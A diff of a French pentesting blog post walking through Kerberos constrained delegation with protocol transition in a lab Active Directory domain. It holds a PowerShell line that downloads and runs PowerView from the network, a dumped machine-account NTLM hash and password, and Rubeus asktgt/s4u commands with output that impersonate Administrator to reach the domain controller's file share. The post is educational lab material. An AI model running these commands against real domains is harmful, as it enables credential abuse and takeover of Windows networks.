@@ -4,9 +4,8 @@ title:  "Démystifier la délégation kerberos avec transition de protocole"
 date:   2020-10-04
 category: Pentesting
 excerpt_separator: <!--more-->
-published: false
 ---  
-*P.S: an english version will be released soon.*    
+*P.S: an english version will be translated soon.*    
 
 Bonjour,  
   
@@ -20,7 +19,7 @@ Pour ne pas réinventer la roue, vous trouverez un très bon article introduisan
   
 ```powershell
 Get-ADComputer -Identity srv | Set-ADAccountControl -TrustedToAuthForDelegation $True
-Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.WINDOMAIN.LOCAL','TIME/DC')}
+Set-ADComputer -Identity srv -Add @{'msDS-AllowedToDelegateTo'=@('TIME/DC.DOMAIN.LOCAL','TIME/DC')}
 ```
   
 ou via GUI:  
@@ -33,21 +32,25 @@ Rentrons dans le vif du sujet.
   
 # Enumeration
 
-La première chose intéressante est de pouvoir énumérer les comptes de service concernés par T2A4D :  
+La première chose intéressante est de pouvoir énumérer les objets concernés par T2A4D :  
 ```
-TODO Get-ADObject
-lien sur Invoke-Recon
-Résultats d'invoke-recon sur le sujet
+PS C:\Users\Administrator\Documents\Invoke-Recon> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+PS C:\Users\Administrator\Documents\Invoke-Recon> Get-DomainObject -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=16777216)" -Properties DistinguishedName,sAMAccountType,userAccountControl,msDS-AllowedToDelegateTo | fl
+
+
+samaccounttype           : MACHINE_ACCOUNT
+distinguishedname        : CN=SRV,CN=Computers,DC=phackt,DC=local
+useraccountcontrol       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION, TRUSTED_TO_AUTH_FOR_DELEGATION
+msds-allowedtodelegateto : {TIME/DC01, TIME/DC01.PHACKT.LOCAL, TIME/DC, TIME/DC.DOMAIN.LOCAL}
 ```
+
   
 # Scénario d'attaque  
 
 Nous allons compromettre une machine **srv$** dont la propriété **useraccountcontrol** possède la valeur  **trusted_to_auth_for_delegation**.  
 
 ![t2a4d]({{ site.url }}/public/images/t2a4d/recon_t2a4d.png)
-
-# Scénario  
-
+  
 La machine **srv$** fait tourner un service **SA** qui ne gère pas l'authentification Kerberos. Si un utilisateur **whatever** s'authentifie sur SA, **la délégation contrainte avec transition de protocole** va cependant permettre à SA de demander un ticket de service pour **SB** en prenant l'identité de l'utilisateur whatever.  
 
 *SB* est soit dans le champs **msDS-AllowedToDelegateTo** de *SA*, soit *SA* est dans le champs **msds-allowedtoactonbehalfofotheridentity** de *SB* (Resource-Based Constrained Delegation).  
@@ -95,26 +98,26 @@ SID               : S-1-5-90-0-2
         msv :
          [00000003] Primary
          * Username : srv$
-         * Domain   : WINDOMAIN
+         * Domain   : DOMAIN
          * NTLM     : b5858035cb595dd82050f9193b220232
          * SHA1     : b7607fdc98a40ae1cfb47478b8d929139d18f6cb
         tspkg :
         wdigest :
          * Username : SRV$
-         * Domain   : WINDOMAIN
+         * Domain   : DOMAIN
          * Password : (null)
         kerberos :
          * Username : SRV$
-         * Domain   : windomain.local
+         * Domain   : domain.local
          * Password : HXEq%dCV$Qp0`b-:LE,zT]x%Sl&G_n8C1eP(aIymKGM-d^E;J5>$uj*0? &duWc:"$tL$KtkJuqE+t[s@fw$#YA:O$Bh<%usYq@vU5 ,i6q^JK=q9bV:Ue?Y
         ssp :
         credman :
 ...
 ```
 
-Maintenant il nous faut dérouler les S4U pour générer un ticket de service, non pas pour *TIME/DC*, mais pour *CIFS/DC* pour l'utilisateur **WINDOMAIN\Administrator**.  
+Maintenant il nous faut dérouler les S4U pour générer un ticket de service, non pas pour *TIME/DC*, mais pour *CIFS/DC* pour l'utilisateur **DOMAIN\Administrator**.  
 
-Faire un ```runas /user:WINDOMAIN\test cmd.exe``` (mdp => Bonjour123!).  
+Faire un ```runas /user:DOMAIN\test cmd.exe``` (mdp => Bonjour123!).  
 
 ```
 C:\tools>dir \\DC\C$
@@ -123,7 +126,7 @@ Access is denied.
 
 En premier, nous demandons un TGT pour le compte de service compromis *srv$* :
 ```cmd
-C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user:srv$ /domain:windomain.local /ntlm:b5858035cb595dd82050f9193b220232 /outfile:srv.tgt
+C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user:srv$ /domain:domain.local /ntlm:b5858035cb595dd82050f9193b220232 /outfile:srv.tgt
 
    ______        _
   (_____ \      | |
@@ -137,7 +140,7 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user
 [*] Action: Ask TGT
 
 [*] Using rc4_hmac hash: b5858035cb595dd82050f9193b220232
-[*] Building AS-REQ (w/ preauth) for: 'windomain.local\srv$'
+[*] Building AS-REQ (w/ preauth) for: 'domain.local\srv$'
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
@@ -166,10 +169,10 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user
 [*] Ticket written to srv.tgt
 
 
-  ServiceName           :  krbtgt/windomain.local
-  ServiceRealm          :  WINDOMAIN.LOCAL
+  ServiceName           :  krbtgt/domain.local
+  ServiceRealm          :  DOMAIN.LOCAL
   UserName              :  srv$
-  UserRealm             :  WINDOMAIN.LOCAL
+  UserRealm             :  DOMAIN.LOCAL
   StartTime             :  9/25/2020 6:05:07 PM
   EndTime               :  9/26/2020 4:05:07 AM
   RenewTill             :  10/2/2020 6:05:07 PM
@@ -180,7 +183,7 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe asktgt /user
 
 Ensuite ce TGT va nous permettre d'initier le **S4U2Self**. Ensuite interviendra le **S4U2Proxy** comme expliqué précédemment pour le service *CIFS* (*voir /altservice:cifs*) :
 ```cmd
-C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:srv.tgt /msdsspn:TIME/DC /impersonateuser:Administrator /domain:windomain.local /altservice:CIFS /ptt
+C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:srv.tgt /msdsspn:TIME/DC /impersonateuser:Administrator /domain:domain.local /altservice:CIFS /ptt
 
    ______        _
   (_____ \      | |
@@ -195,11 +198,11 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:
 
 [*] Action: S4U
 
-[*] Using domain controller: dc.windomain.local (192.168.38.102)
-[*] Building S4U2self request for: 'srv$@WINDOMAIN.LOCAL'
+[*] Using domain controller: dc.domain.local (192.168.38.102)
+[*] Building S4U2self request for: 'srv$@DOMAIN.LOCAL'
 [*] Sending S4U2self request
 [+] S4U2self success!
-[*] Got a TGS for 'Administrator@WINDOMAIN.LOCAL' to 'srv$@WINDOMAIN.LOCAL'
+[*] Got a TGS for 'Administrator@DOMAIN.LOCAL' to 'srv$@DOMAIN.LOCAL'
 [*] base64(ticket.kirbi):
 
       doIFuDCCBbSgAwIBBaEDAgEWooIEsjCCBK5hggSqMIIEpqADAgEFoREbD1dJTkRPTUFJTi5MT0NBTKIR
@@ -231,7 +234,7 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:
 [+] Ticket successfully imported!
 [*] Impersonating user 'Administrator' to target SPN 'TIME/DC'
 [*]   Final ticket will be for the alternate service 'cifs'
-[*] Using domain controller: dc.windomain.local (192.168.38.102)
+[*] Using domain controller: dc.domain.local (192.168.38.102)
 [*] Building S4U2proxy request for service: 'TIME/DC'
 [*] Sending S4U2proxy request
 [+] S4U2proxy success!
@@ -269,12 +272,12 @@ C:\tools> C:\tools\Rubeus\Rubeus-master\Rubeus\bin\Debug\rubeus.exe s4u /ticket:
 
 ```
 
-Nous avons bien notre ticket de service pour **CIFS/DC** au nom de **WINDOMAIN\Administrator** :
+Nous avons bien notre ticket de service pour **CIFS/DC** au nom de **DOMAIN\Administrator** :
 ```cmd
 C:\tools> klist
 ...
-#1>     Client: Administrator @ WINDOMAIN.LOCAL
-        Server: cifs/dc @ WINDOMAIN.LOCAL
+#1>     Client: Administrator @ DOMAIN.LOCAL
+        Server: cifs/dc @ DOMAIN.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
         Start Time: 9/25/2020 18:05:46 (local)
